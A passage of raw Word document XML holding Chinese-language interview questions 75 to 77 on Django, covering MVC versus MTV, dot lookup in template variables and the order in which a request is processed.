          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> static </w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>标签</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25032218" w14:textId="19A91C82" w:rsidR="006B2B80" w:rsidRPr="002111E5" w:rsidRDefault="002111E5" w:rsidP="006B2B8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75</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MVC</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MTV</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>区别</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043FBDC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模型</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(M),</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>控制器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(C ),</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>视图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(V)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C61151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模型负责业务对象与数据库的对象</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(ORM),</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>视图负责与用户的交互</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>页面</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，控制器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(C)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>接受用户的输入调用模型和视图完成用户的请求。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53733FB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Model(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模型</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：负责业务对象与数据库的对象</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(ORM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="075F3A7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Template(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模版</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：负责如何把页面展示给用户</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B521CC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View(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>视图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：负责业务逻辑，并在适当的时候调用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Template</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4825DCD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此外，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>还有一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>分发器，它的作用是将一个个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的页面请求分发给不同的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>view</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>处理，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>view</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>再调用相应的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Template</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9553DB" w14:textId="591412C3" w:rsidR="006B2B80" w:rsidRPr="002111E5" w:rsidRDefault="002111E5" w:rsidP="006B2B8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76</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>模板变量中点“</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.”</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的特殊含义</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EBEE42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点（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）在模板语言中有特殊的含义，用来获取对象的相应属性值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C43A61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模板系统遇到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(.)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>时按以下查询顺序查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A47150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字典查询，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>变量名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">.key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>获取值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33FF47A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属性或方法查询，传递对象，变量名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>变量名（属性或无参数的方法名称）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="636C806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数字索引查询，列表，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>变量名</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>索引</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54879643" w14:textId="6F01C4B8" w:rsidR="006B2B80" w:rsidRPr="002111E5" w:rsidRDefault="002111E5" w:rsidP="006B2B8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77</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>执行顺序</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="709C58C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1.wsgi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，请求封装后交给</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>框架（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Flask</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3908008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请求中间件，对请求进行校验或在请求对象中添加其他相关数据，例如：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>csrf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>request.session -</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0309E4B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路由匹配，根据浏览器发送的不同</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>去匹配不同的视图函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D98CD0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4.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>视图函数，在视图函数中进行业务逻辑的处理，可能涉及到：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>orm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">templates =&gt; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>渲染</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59FE390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5.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>响应中间件，对响应的数据进行处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08DE5D7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6.wsgi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，将响应的内容发送给浏览器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B57B1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总之：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E403D2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一般是用户通过浏览器向我们的服务器发起一个请求</w:t>
      </w:r>
